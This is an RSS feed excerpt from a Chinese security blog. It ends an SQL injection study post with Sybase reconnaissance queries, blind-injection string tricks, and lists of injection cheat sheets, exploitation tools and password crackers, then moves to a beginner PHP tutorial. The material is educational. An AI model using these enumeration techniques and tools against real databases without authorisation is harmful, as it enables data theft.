&lt;td&gt;数   据&lt;/td&gt;
&lt;td&gt;查   询&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;版本&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT @@version;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;当前用户&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT username();&lt;/code&gt;&lt;br&gt;&lt;code&gt; SELECT suser_name();&lt;/code&gt;&lt;br&gt;&lt;code&gt; SELECT user;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出用户&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT name FROM master..syslogins;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;当前用户权限&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT show role(); &lt;/code&gt;&lt;br&gt;&lt;code&gt; EXEC sp_helprotect &amp;lt;user&amp;gt;;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;提取Sybase数据库的模式信息&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数   据&lt;/th&gt;
&lt;th&gt;查   询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;当前数据库&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT db_name();&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出数据库&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT name FROM master..sysdatabases;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出表&lt;/td&gt;
&lt;td&gt;列出当前数据库中的表： &lt;br&gt;&lt;code&gt;SELECT name FROM sysobjects WHERE type=&#39;U&#39;; &lt;/code&gt;&lt;br&gt;&lt;code&gt;SELECT name FROM sysobjects WHERE type=&#39;V&#39;-- 视图 &lt;/code&gt;&lt;br&gt;列出master数据库中的表： &lt;br&gt;&lt;code&gt;SELECT name FROM master..sysobjects WHERE type= &#39;U&#39;;&lt;/code&gt;&lt;br&gt;&lt;code&gt;SELECT name FROM  master..sysobjects WHERE type=&#39;V&#39;;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出列&lt;/td&gt;
&lt;td&gt;列出当前数据库中tblUsers表的各个列的名称：&lt;br&gt;&lt;code&gt;SELECT name FROM syscolumns WHERE  id=object_ id(&#39;tblUsers&#39;);&lt;/code&gt;&lt;br&gt;  列出admin数据库中tblUsers表的各个列的名称：&lt;br&gt;&lt;code&gt;  SELECT  name FROM admin..syscolumns WHERE id=object_id(&#39;admin..tblUsers&#39;);&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;SQL盲注函数：Sybase&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;SQL盲注函数&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数   据&lt;/th&gt;
&lt;th&gt;查   询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;字符串长度&lt;/td&gt;
&lt;td&gt;&lt;code&gt;LEN();&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;从给定字符串中提取子串&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SUBSTRING(string,offset,length);&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;字符串(‘ABC’)不带单引号的表示方式&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT char(65)+char(66)+char(67);&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h4 id=&#34;Microsoft-Access&#34;&gt;&lt;a href=&#34;#Microsoft-Access&#34; class=&#34;headerlink&#34; title=&#34;Microsoft Access&#34;&gt;&lt;/a&gt;Microsoft Access&lt;/h4&gt;&lt;p&gt;Microsoft Access数据库无法很好地适应企业级应用，所以通常只在具有极小数据库需求 的应用中才会遇到。&lt;/p&gt;
&lt;h3 id=&#34;资源&#34;&gt;&lt;a href=&#34;#资源&#34; class=&#34;headerlink&#34; title=&#34;资源&#34;&gt;&lt;/a&gt;资源&lt;/h3&gt;&lt;h4 id=&#34;SQL注入白皮书&#34;&gt;&lt;a href=&#34;#SQL注入白皮书&#34; class=&#34;headerlink&#34; title=&#34;SQL注入白皮书&#34;&gt;&lt;/a&gt;SQL注入白皮书&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Victor Chapela 撰写的 “Advanced SQL Injection” : &lt;a href=&#34;www.owasp.org/index.php/Image:Advanced_SQL_Injection.ppt&#34;&gt;www.owasp.org/index.php/Image:Advanced_SQL_Injection.ppt&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Chris Anley撰写的”Advanced SQL Injection in SQL Server Applications”：&lt;a href=&#34;http://www.ngssoftware.com/papers/advanced_sql_injection.pdf&#34;&gt;www.ngssoftware.com/papers/advanced_sql_injection.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Gary O’Leary-Steele撰写的”Buffer Truncation Abuse in.NET and Microsoft SQL&lt;br&gt;Server”：&lt;a href=&#34;http://scanner.sec-1.com/resources/bta.pdf&#34;&gt;http://scanner.sec-1.com/resources/bta.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Brett Moore撰写的”Access through Access”：&lt;a href=&#34;http://www.insomniasec.com/publications/Access-Through-Access.pdf&#34;&gt;www.insomniasec.com/publications/Access-Through-Access.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Chema Alonso撰写的”Time-Based Blind SQL Injection with Heavy Queries”：&lt;a href=&#34;http://technet.microsoft.com/en-us/library/cc512676.aspx&#34;&gt;http://technet.microsoft.com/en-us/library/cc512676.aspx&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;SQL注入备忘单&#34;&gt;&lt;a href=&#34;#SQL注入备忘单&#34; class=&#34;headerlink&#34; title=&#34;SQL注入备忘单&#34;&gt;&lt;/a&gt;SQL注入备忘单&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;PentestMonkey.com 针对 Oracle、Microsoft SQL Server、MySQL、PostgreSQL、Ingres、DB2 和 Informix 的 SQL 注入备忘单：&lt;a href=&#34;http://pentestmonkey.net/cheat-sheets/&#34;&gt;http://pentestmonkey.net/cheat-sheets/&lt;/a&gt; &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Michaeldaw.org 针对 Sybase、MySQL、OraclePostgreSQL、DB2 和 Ingres 的 SQL 注 入备忘单：&lt;a href=&#34;http://michaeldaw.org/sql-injection-cheat-sheet/&#34;&gt;http://michaeldaw.org/sql-injection-cheat-sheet/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Ferruh Mavituna 针对 MySQL、SQL Server、PostgreSQL 和 Oracle 的 SQL 注入备忘单： &lt;a href=&#34;http://ferruh.mavituna.com/sql-injection-cheatssheet-oku/&#34;&gt;http://ferruh.mavituna.com/sql-injection-cheatssheet-oku/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Ferruh Mavituna 针对 Oracle 的 SQL 注入备忘单：&lt;a href=&#34;http://ferruh.mavituna.com/oracle-injection-cheat-sheet-oku/&#34;&gt;http://ferruh.mavituna.com/oracle-injection-cheat-sheet-oku/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;SQL注入利用工具&#34;&gt;&lt;a href=&#34;#SQL注入利用工具&#34; class=&#34;headerlink&#34; title=&#34;SQL注入利用工具&#34;&gt;&lt;/a&gt;SQL注入利用工具&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Absinthe 是一款基于 Windows GUI 的利用工具，支持 Microsoft SQL Server、Oracle、PostgreSQL 和 Sybase，并使用 SQL 盲注和基于错误的 SQL 注入：&lt;a href=&#34;http://www.0x90.org/releases/absinthe/&#34;&gt;www.0x90.org/releases/absinthe/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;SQLBrute是一款基于时间和错误的SQL盲注工具，支持Microsoft SQL Server和Oracle： &lt;a href=&#34;https://github.com/GDSSecurity/SQLBruteo&#34;&gt;https://github.com/GDSSecurity/SQLBruteo&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Bobcat 是一款基于 Windows GUI 的工具，支持 Microsoft SQL Server 漏洞利用：&lt;a href=&#34;http://web.mac.com/nmonkee/pub/bobcat.html&#34;&gt;http://web.mac.com/nmonkee/pub/bobcat.html&lt;/a&gt; &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;BSQL Hacker在SQL注入利用领域是一款相对较新的工具。是一种基于Windows的GUI 应用程序，支持Microsoft SQL Server、Oracle和MySQL,并支持SQL盲注和基于错误的 SQL 注入技术：&lt;a href=&#34;http://labs.portcullis.co.uk/application/bsql-hacker/&#34;&gt;http://labs.portcullis.co.uk/application/bsql-hacker/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;很多攻击者认为SQLMap是目前最好的SQL注入漏洞利用工具：&lt;a href=&#34;http://sqlmap.source-fbrge.net/&#34;&gt;http://sqlmap.source- fbrge.net/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Sqlninja是一款使用Perl编写的且关注获取代码执行的Microsoft SQL注入工具：&lt;a href=&#34;http://sqlninja.sourceforge.net/&#34;&gt;http://sqlninja.sourceforge.net/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Squeeza被作为BlackHat展示的一部分发布。它关注的是可选的通信通道，支持Microsoft SQL Server： &lt;a href=&#34;http://www.sensepost.com/research/squeezao&#34;&gt;www.sensepost.com/research/squeezao&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;口令破解工具&#34;&gt;&lt;a href=&#34;#口令破解工具&#34; class=&#34;headerlink&#34; title=&#34;口令破解工具&#34;&gt;&lt;/a&gt;口令破解工具&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Cain &amp;amp; Abel： &lt;a href=&#34;http://www.oxid.it/&#34;&gt;www.oxid.it&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Woraauthbf： &lt;a href=&#34;http://www.soonerorlater.hu/index.khtml?article_id=513&#34;&gt;www.soonerorlater.hu/index.khtml?article_id=513&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Checkpwd: &lt;a href=&#34;http://www.red-database-security.com/software/checkpwd.html&#34;&gt;www.red-database-security.com/software/checkpwd.html&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;John the Ripper： &lt;a href=&#34;http://www.openwall.com/john/&#34;&gt;www.openwall.com/john/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://0xdadream.github.io/2021/05/27/phps-study/</guid>
            <title>php复习</title>
            <link>https://0xdadream.github.io/2021/05/27/phps-study/</link>
            <category>学习</category>
            <category>php</category>
            <pubDate>Thu, 27 May 2021 09:25:00 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;php-study&#34;&gt;&lt;a href=&#34;#php-study&#34; class=&#34;headerlink&#34; title=&#34;php_study&#34;&gt;&lt;/a&gt;php_study&lt;/h1&gt;&lt;h3 id=&#34;注释&#34;&gt;&lt;a href=&#34;#注释&#34; class=&#34;headerlink&#34; title=&#34;注释&#34;&gt;&lt;/a&gt;注释&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;//单行注释&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;/*
多行注释
*/&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;变量&#34;&gt;&lt;a href=&#34;#变量&#34; class=&#34;headerlink&#34; title=&#34;变量&#34;&gt;&lt;/a&gt;变量&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;/*
变量以 $ 符号开始，后面跟着变量的名称
变量名必须以字母或者下划线字符开始
变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）
变量名不能包含空格
变量名是区分大小写的（$y 和 $Y 是两个不同的变量）
*/&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;//声明&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;hello&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$var1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Content-Type: text/html;charset=utf-8&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$x&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 全局变量&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$y&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;myTest&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token variable&#34;&gt;$y&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 局部变量&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;p&amp;gt;测试函数内变量:&amp;lt;p&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;变量 x 为: &lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$x&lt;/span&gt;&lt;/span&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;变量 y 为: &lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$y&lt;/span&gt;&lt;/span&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt; 
&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;yourTest&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;global&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$x&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$y&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token variable&#34;&gt;$y&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$x&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$y&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;myTest&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;testest&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;//该变量会保留上次调用函数产生的值&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;token function&#34;&gt;testest&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;p&amp;gt;测试函数外变量:&amp;lt;p&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;变量 x 为: &lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$x&lt;/span&gt;&lt;/span&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;变量 y 为: &lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$y&lt;/span&gt;&lt;/span&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;yourTest&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;p&amp;gt;测试函数外变量:&amp;lt;p&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;变量 x 为: &lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$x&lt;/span&gt;&lt;/span&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;变量 y 为: &lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;$y&lt;/span&gt;&lt;/span&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;
    
/*
测试函数内变量:

变量 x 为:
变量 y 为: 101

测试函数外变量:

变量 x 为: 5
变量 y 为: 10

测试函数外变量:

变量 x 为: 5
变量 y 为: 15
*/&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;echo-print&#34;&gt;&lt;a href=&#34;#echo-print&#34; class=&#34;headerlink&#34; title=&#34;echo/print&#34;&gt;&lt;/a&gt;echo/print&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; 可以输出一个或多个字符串
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; 只允许输出一个字符串，返回值总为 &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;PHP-EOF&#34;&gt;&lt;a href=&#34;#PHP-EOF&#34; class=&#34;headerlink&#34; title=&#34;PHP_EOF&#34;&gt;&lt;/a&gt;PHP_EOF&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;1&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;PHP_EOP&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;3&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;EOF&#34;&gt;&lt;a href=&#34;#EOF&#34; class=&#34;headerlink&#34; title=&#34;EOF&#34;&gt;&lt;/a&gt;EOF&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string heredoc-string&#34;&gt;&lt;span class=&#34;token delimiter symbol&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt;EOF&lt;/span&gt;
        &amp;lt;h1&amp;gt;我的第一个标题&amp;lt;/h1&amp;gt;
        &amp;lt;p&amp;gt;我的第一个段落。&amp;lt;/p&amp;gt;
&lt;span class=&#34;token delimiter symbol&#34;&gt;EOF&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
